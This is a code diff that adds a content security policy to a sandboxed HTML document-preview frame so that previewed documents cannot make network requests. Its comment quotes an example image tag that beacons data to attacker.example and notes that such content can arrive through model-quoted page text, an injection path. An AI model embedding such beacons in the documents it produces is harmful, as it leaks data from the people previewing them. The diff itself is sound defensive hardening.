@@ -121,12 +121,27 @@ export function escapeHtml(s) {
  * document is inert by construction; the styling exists only so a Word or
  * Excel preview reads like a document instead of like unstyled markup.
  */
+/**
+ * The preview frame's own content security policy.
+ *
+ * The iframe's `sandbox` attribute stops scripts; it does NOT stop the network.
+ * Without this, a document carrying `<img src="https://attacker.example/?leak=…">`
+ * would beacon the moment the operator previewed it — and document content can
+ * originate from page content a model quoted, which is exactly the injection
+ * path this project's threat model names. `default-src 'none'` means no
+ * request of any kind leaves the frame; inline styles are allowed because this
+ * wrapper's own stylesheet is inline, and images only as `data:`, which is
+ * bytes already inside the document rather than a fetch.
+ */
+const PREVIEW_CSP =
+  `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:">`;
+
 export function previewDocument(bodyHtml, { dark = false } = {}) {
   const fg = dark ? "#e8e8ea" : "#1a1a1c";
   const bg = dark ? "#151517" : "#ffffff";
   const line = dark ? "#3a3a40" : "#d5d5da";
   const soft = dark ? "#1f1f23" : "#f4f4f6";
-  return `<!doctype html><html><head><meta charset="utf-8"><style>
+  return `<!doctype html><html><head><meta charset="utf-8">${PREVIEW_CSP}<style>
     body{font:14px/1.65 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;color:${fg};background:${bg};margin:0;padding:16px}
     h1,h2,h3,h4,h5,h6{line-height:1.25;margin:1.2em 0 .5em}
     h1{font-size:1.6em}h2{font-size:1.35em}h3{font-size:1.15em}
